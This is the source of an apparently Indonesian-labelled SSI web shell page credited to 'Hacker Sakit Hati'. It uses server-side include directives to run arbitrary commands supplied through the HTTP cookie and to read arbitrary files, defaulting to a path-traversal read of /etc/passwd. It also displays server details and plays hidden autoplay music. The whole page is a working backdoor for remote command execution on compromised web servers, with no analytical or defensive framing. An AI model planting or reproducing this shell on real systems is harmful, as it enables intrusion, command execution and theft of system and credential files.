<center>
<table style="background: #;" border="1">
<tbody>
<tr>
<th style="background: blink;"><!--by hacker sakit hati-->  ..:: [+] Antonio HsH [+]::..<!--#config errmsg="[Error in shell]"--> <!--#config sizefmt="bytes"--> <!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"GET\")" --> <!--#set var="shl" value="ls -al" --> <!--#else --> <!--#set var="shl" value=$HTTP_COOKIE --> <!--#endif --> <!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"POST\")" --> <!--#set var="inc" value="/../../../../../../../etc/passwd" --> <!--#else --> <!--#set var="inc" value=$HTTP_COOKIE --> <!--#endif --> ..:: [+] Antonio HsH [+]::..
<script language="javascript">// <![CDATA[
    function doit( mode ) {
        if( document.cookie != "" ) {
            var cookies = document.cookie.split( ";" );
            for( var i = 0; i < cookies.length; ++i )  
               document.cookie = cookies[ i ] + ";expires=Thu, 01 Jan 1970 00:00:00 GMT";
       }
       document.cookie = document.getElementById( mode ).value;
       document.location.reload();
    }
    function toggle( id ) {
       document.getElementById( id ).style.display = (document.getElementById( id ).style.display == "none") ? "block" : "none";
    }
    
// ]]></script>
<div align="center">
<table border="1" width="100%" id="table1" style="border: 1px dotted #FFCC99;" cellspacing="0" cellpadding="0" height="502">
<tbody>
<tr>
<td style="border: 1px dotted Lavender;" valign="top" rowspan="2">
<p align="center"><b> <font face="Tahoma" size="2"> </font> _______________________________ <br /> <font color=" white " face="Tahoma" size="2"> <span style="text-decoration: none;"> <font color=" aqua "> <br /> <span style="text-decoration: none;"><font onclick="toggle('inf');" style="cursor: hand;" color=" aqua ">Rincian Server </font></span></font></span></font></b></p>
<p align="center"><b> <font onclick="toggle('shl');" style="cursor: hand;" face="Tahoma" size="2" color=" aqua "> <span style="text-decoration: none;">Command </span></font></b></p>
<p align="center"><b> <font face="Tahoma" size="2" color=" aqua "> <span style="text-decoration: none;"><font onclick="toggle('inc');" style="cursor: hand;" color=" aqua ">Berkas Dilihat</font></span></font></b></p>
____________________________________
<p>&nbsp;</p>
<p align="center">&nbsp;</p>
</td>
<td height="422" width="82%" style="border: 1px dotted Lavender;" align="center">_________________________________________________________________________________________________________________________________________
<script language="JavaScript1.2">// <![CDATA[
function ClearError() {return true;}
window.onerror = ClearError;
// ]]></script>
<div align="center"><center>
<script>// <![CDATA[
farbbibliothek = new Array();
farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100");
farbbibliothek[1] = new Array("#FF0000","#FFFFFF","#FFFFFF","#FF0000");
farbbibliothek[2] = new Array("#FFFFFF","#FF0000","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF","#FFFFFF");
farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040");
farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000");
farbbibliothek[5] = new Array("#FF0000","#FF0000","#FF0000","#FFFFFF","#FFFFFF","#FFFFFF");
farbbibliothek[6] = new Array("#FF0000","#FDF5E6");
farben = farbbibliothek[4];
function farbschrift()
{
for(var i=0 ; i<Buchstabe.length; i++)
{
document.all["a"+i].style.color=farben[i];
}
farbverlauf();
}
function string2array(text)
{
Buchstabe = new Array();
while(farben.length<text.length)
{
farben = farben.concat(farben);
}
k=0;
while(k<=text.length)
{
Buchstabe[k] = text.charAt(k);
k++;
}
}
function divserzeugen()
{
for(var i=0 ; i<Buchstabe.length; i++)
{
document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span>");
}
farbschrift();
}
var a=1;
function farbverlauf()
{
for(var i=0 ; i<farben.length; i++)
{
farben[i-1]=farben[i];
}
farben[farben.length-1]=farben[-1];
setTimeout("farbschrift()",30);
}
//
var farbsatz=1;
function farbtauscher()
{
farben = farbbibliothek[farbsatz];
while(farben.length<text.length)
{
farben = farben.concat(farben);
}
farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001));
}
setInterval("farbtauscher()",9000);
text ="HACKER SAKIT HATI SELL HTML  ";//h
string2array(text);
divserzeugen();
//document.write(text);
// ]]></script>
</center></div>
</td>
</tr>
</tbody>
</table>
</div>
</th>
</tr>
</tbody>
</table>
</center>
<p><font color="aqua " size="2">Aplikasi : <!--#echo var="SERVER_SOFTWARE" --><br />IP :<!--#echo var="REMOTE_ADDR" --></font><br /> <font face=" arial " color="  " size="2"><font face=" arial " color="  " size="2"> _____________________________________________________________________________________________________________________ <br /></font></font></p>
<div id="inf"><br /> <font color=" white "> Hubungkan Server </font>:&nbsp;&nbsp;&nbsp; <!--#echo var="SERVER_NAME" --> <br /> <font color=" white ">Alamat IP :</font>:&nbsp;&nbsp;&nbsp; <!--#echo var="REMOTE_ADDR" --> <br /> <font color=" white">Aplikasi Server </font>:&nbsp;&nbsp;&nbsp; <!--#echo var="SERVER_SOFTWARE" --> <br /> <font color=" white ">Data Direktori </font>:&nbsp;&nbsp;&nbsp; <!--#echo var="DOCUMENT_ROOT" --> <br /> <font color=" white ">Data Direktori </font>:&nbsp;&nbsp;&nbsp; <!--#exec cmd="ls -lsa" --> <br /> </div>
<div border="0" id="shl" --="" if="" expr="\" request_method="" get="">display:block;<!--#endif -->&gt; <br /><font color=" lime "> MASUKAN PERINTAH </font> :&nbsp;&nbsp;&nbsp;<form method="get" onsubmit="doit('command');"><input type="text" size="80" value="dir" id="command" />&nbsp;<input type="submit" value="Command" /></form><br /><center><b><font size="+1"> Hasilnya </font></b></center><br /> <font color=" lime ">Perintah Eksekusi </font>:&nbsp;&nbsp;&nbsp; <!--#echo var=shl --> <br /> <textarea bgcolor="#" cols="100" rows="15'" style="background: #000000; color: aqua; border: 2px; background-image: url(data:image/gif; base64,r0lgodlhmgaqalmlabcxfyymjjawmb0dhsagiboaghkzgrqufcqkjbwchaaaap///waaaaaaaaaaaaaaach/c05fvfndqvbfmi4waweaaaah+qqfcgalacwaaaaamgaqaaae/1djsau9onutjixiisxjxhkkgpjdf7qickrqzci3quhtkd25la0n2e14r+bknvl4vkxnt0qbpovczsmhjeam0x+xkv7ykoulcwwkjqiayswlgmhbijbsjklunycbgooehya1i1xzejj4cyqtji9cxvrerwdkl02yswowlvxbvvpuo5xztaiuuzaayjualrcyxh52tnb8e40oj7p5l70jwibgx8jjfznluzc7kvfzi8jztawuxljrmq+zy6egrau2vqqk55vi2unb3gpenjm/cxs4b/vzt9dumxpkaamktcajz7ngmqqiodgndynan7jaghheg7wxskcks6qxlzrv6ybodaqybo3ja2k2wvjirb4jlrnyoxiobkdnm8cy4ke0rcdpztb4uvr0lse2diwplgznzbrhc6iyskvzprtrpkiuxgz6p6e+rvs44sjjtqyggzd1rum7uxqewd+mxu2uuitkj6ekovu4ssnikxfdtscprmhlxg37dgwrgnc/s4uiaaah+qqfcgalacwbaaeamaaoaaae/zalrrgi6qrdnc9bfyosvicf+jukplyuochzxdmy3vke0t+yya4s3e2er0psibnalkyxdejnxwzd3s/ktaqafcfarqz9pmov5zqyp8guuhxor9vv+lyd5vawyxymkgvol1noqlravzpti1vyu1ajs05dtzhpuyltsylcj1wvgke2opizxncff30iymudfywvy316ulm6u3qbzxythxy0hymsqdqjpckyp81yqp1dnkmtlexul0zvvfk+jexgroittb9qfrlc6lswfaq88flzeskcnyn2gm2ssmyiibgnaujqmykdwqaendktirfn0ao5iygpxddlbkeh9leojjks7homoqs2olureihtzuvxbpisysxvjsb28ic3m59slcn3ori3atk0wbkmbzrgnawritvz7qlln7fahvxa8syijyqzas1tvumirula5pszswdtm0sndjsl08dqhzme/sqmf8fzjfvakoveqwtyeghltajcigueach5baukaasalaeaaqawacgaaat/skci1emnplqtrgjsxzkiuv5jgikhuiord1wly2b3vy68zzifakhr1iw0zk5yiyjrngprzzsvq0erlkcfbnonysoyaig/qshgxaqn2cb1z06v2+/4vh7pv4dgah9wb0zhbhuajyjaxkunp0pumjgqwoxrhzdkmfdcnp2cn4yvolaqrz1jx54icosta4rjcwuvh7wvrn27vl2+fyidy2ocsmihrythp8xwn49wqz07r5zwkzpqsk6rmmum4fmlod/sldg0zsyqga7dxxmaugo/9fb3e26zhvhrgvwoxpyqdqodwxcqjh3p4ssule/xqmwcue3iwscoujtdafbjtbf6fncks9xvxymrjkrcq4gvpct7wqolihlwjyuzr7qcoyfjipdjoxau2smxcuwjjlixmrij58+fxz5tnigspucvbfrbetyu1suvypnsy5su0dhbbkiekmjuedtg0i46nmpo2dylrhlonpl2mvrn33p2utgl19y0sqqru4pcbqqaifkebqoacwasaqabadaakaaabp8wjuulvquvetlhhvgpchj1i0qv1avmfkhiilfttn3r5jxjt1xrauuzxkgkbfi8klvnovrg++2apkfv2kseajuvjbnrqmwh9aghgijeplzrtq/b7/i8fp8/k1dof2pwfmmahmuovlqxtoxxkekzk5nvnuxctpo9t52sjkeguiuunjvyqfoujzl+h3fugk9nz15gsmwcz3y8vb6/fcyera5lhymktmfcwkgspdtpzs1zqlbe2dciupjwnqe+zkxq2kmmxkbyylzwguziblhl6sd19vd6tgncubxeayj0);background-repeat: repeat; background-position: top; background-attachment: fixed;">    &lt;!--#exec cmd=$shl --&gt;
    </textarea></div>
<div id="inc" style="display: none;"><!--#if expr="\"$REQUEST_METHOD\" != \"POST\"" --><!--#endif --><br /> <font color=" lime "> Masukkan Berkas </font>:&nbsp;&nbsp;&nbsp;<form method="post" onsubmit="doit('vfile');"><input type="text" size="80" id="vfile" />&nbsp;<input type="submit" value="Run" /></form><br /> <font color=" lime ">Buka Berkas</font> :&nbsp;&nbsp;&nbsp; <!--#echo var=inc --> <br /> <font color=" lime "> Ukuran </font> :&nbsp;&nbsp;&nbsp; <!--#fsize virtual=$inc -->&nbsp;bytes <br /> <textarea bgcolor="#" cols="100" rows="15'" style="background: #000000; color: aqua; border: 2px; background-image: url(data:image/gif; base64,r0lgodlhmgaqalmlabcxfyymjjawmb0dhsagiboaghkzgrqufcqkjbwchaaaap///waaaaaaaaaaaaaaach/c05fvfndqvbfmi4waweaaaah+qqfcgalacwaaaaamgaqaaae/1djsau9onutjixiisxjxhkkgpjdf7qickrqzci3quhtkd25la0n2e14r+bknvl4vkxnt0qbpovczsmhjeam0x+xkv7ykoulcwwkjqiayswlgmhbijbsjklunycbgooehya1i1xzejj4cyqtji9cxvrerwdkl02yswowlvxbvvpuo5xztaiuuzaayjualrcyxh52tnb8e40oj7p5l70jwibgx8jjfznluzc7kvfzi8jztawuxljrmq+zy6egrau2vqqk55vi2unb3gpenjm/cxs4b/vzt9dumxpkaamktcajz7ngmqqiodgndynan7jaghheg7wxskcks6qxlzrv6ybodaqybo3ja2k2wvjirb4jlrnyoxiobkdnm8cy4ke0rcdpztb4uvr0lse2diwplgznzbrhc6iyskvzprtrpkiuxgz6p6e+rvs44sjjtqyggzd1rum7uxqewd+mxu2uuitkj6ekovu4ssnikxfdtscprmhlxg37dgwrgnc/s4uiaaah+qqfcgalacwbaaeamaaoaaae/zalrrgi6qrdnc9bfyosvicf+jukplyuochzxdmy3vke0t+yya4s3e2er0psibnalkyxdejnxwzd3s/ktaqafcfarqz9pmov5zqyp8guuhxor9vv+lyd5vawyxymkgvol1noqlravzpti1vyu1ajs05dtzhpuyltsylcj1wvgke2opizxncff30iymudfywvy316ulm6u3qbzxythxy0hymsqdqjpckyp81yqp1dnkmtlexul0zvvfk+jexgroittb9qfrlc6lswfaq88flzeskcnyn2gm2ssmyiibgnaujqmykdwqaendktirfn0ao5iygpxddlbkeh9leojjks7homoqs2olureihtzuvxbpisysxvjsb28ic3m59slcn3ori3atk0wbkmbzrgnawritvz7qlln7fahvxa8syijyqzas1tvumirula5pszswdtm0sndjsl08dqhzme/sqmf8fzjfvakoveqwtyeghltajcigueach5baukaasalaeaaqawacgaaat/skci1emnplqtrgjsxzkiuv5jgikhuiord1wly2b3vy68zzifakhr1iw0zk5yiyjrngprzzsvq0erlkcfbnonysoyaig/qshgxaqn2cb1z06v2+/4vh7pv4dgah9wb0zhbhuajyjaxkunp0pumjgqwoxrhzdkmfdcnp2cn4yvolaqrz1jx54icosta4rjcwuvh7wvrn27vl2+fyidy2ocsmihrythp8xwn49wqz07r5zwkzpqsk6rmmum4fmlod/sldg0zsyqga7dxxmaugo/9fb3e26zhvhrgvwoxpyqdqodwxcqjh3p4ssule/xqmwcue3iwscoujtdafbjtbf6fncks9xvxymrjkrcq4gvpct7wqolihlwjyuzr7qcoyfjipdjoxau2smxcuwjjlixmrij58+fxz5tnigspucvbfrbetyu1suvypnsy5su0dhbbkiekmjuedtg0i46nmpo2dylrhlonpl2mvrn33p2utgl19y0sqqru4pcbqqaifkebqoacwasaqabadaakaaabp8wjuulvquvetlhhvgpchj1i0qv1avmfkhiilfttn3r5jxjt1xrauuzxkgkbfi8klvnovrg++2apkfv2kseajuvjbnrqmwh9aghgijeplzrtq/b7/i8fp8/k1dof2pwfmmahmuovlqxtoxxkekzk5nvnuxctpo9t52sjkeguiuunjvyqfoujzl+h3fugk9nz15gsmwcz3y8vb6/fcyera5lhymktmfcwkgspdtpzs1zqlbe2dciupjwnqe+zkxq2kmmxkbyylzwguziblhl6sd19vd6tgncubxeayj0);background-repeat: repeat; background-position: top; background-attachment: fixed;">    &lt;!--#include virtual=$inc --&gt; 
    </textarea> </div>
<p><font face=" arial " color="  " size="2"><br /> _____________________________________________________________________________________________________________________ <br /></font></p>
<p>Hacker Sakit Hati</p>
<center>
<div id="result"><br />
<script language="JavaScript1.2">// <![CDATA[
var message=" ..::[+  Copyright Â© 2014 Hacker Sakit Hati   +]::..  "// jangan pakai enter
var neonbasecolor=" aqua "
var neontextcolor=" white "
var neontextcolor2="Lavender"  // kode warna kedua
var flashspeed=1	// kecepatan flash neon, semakin kecil semakin cepat
var flashingletters=10	// jumlah huruf yang tersorot oleh flash
var flashingletters2=2	// jumlah warna di ekor flash
var flashpause=1					
///edit by http://googel-indonesia.blogspot.com/
var n=0
if (document.all||document.getElementById){
document.write('<font color="'+neonbasecolor+'">')
for (m=0;m<message.length;m++)
document.write('<span id="neonlight'+m+'">'+message.charAt(m)+'</span>')
document.write('</font>')
}
else
document.write(message)
function crossref(number){
var crossobj=document.all? eval("document.all.neonlight"+number) : document.getElementById("neonlight"+number)
return crossobj
}
function neon(){
//Change all letters to base color
if (n==0){
for (m=0;m<message.length;m++)
crossref(m).style.color=neonbasecolor
}
//cycle through and change individual letters to neon color
crossref(n).style.color=neontextcolor

if (n>flashingletters-1) crossref(n-flashingletters).style.color=neontextcolor2 
if (n>(flashingletters+flashingletters2)-1) crossref(n-flashingletters-flashingletters2).style.color=neonbasecolor
if (n<message.length-1)
n++
else{
n=0
clearInterval(flashing)
setTimeout("beginneon()",flashpause)
return
}
}
function beginneon(){
if (document.all||document.getElementById)
flashing=setInterval("neon()",flashspeed)
}
beginneon()
// ]]></script>
<object width="0" height="0" type="application/x-shockwave-flash" data="http://flash-mp3-player.net/medias/player_mp3_maxi.swf">
    <param name="movie" value="http://flash-mp3-player.net/medias/player_mp3_maxi.swf" />
    <param name="bgcolor" value="#ffffff" />
    <param name="FlashVars" value="mp3=https%3A//hshmp3oke.googlecode.com/svn/HsH-Login.mp3&amp;width=0&amp;height=0&amp;autoplay=1&amp;volume=200" /></object></div>
</center>
<p></p>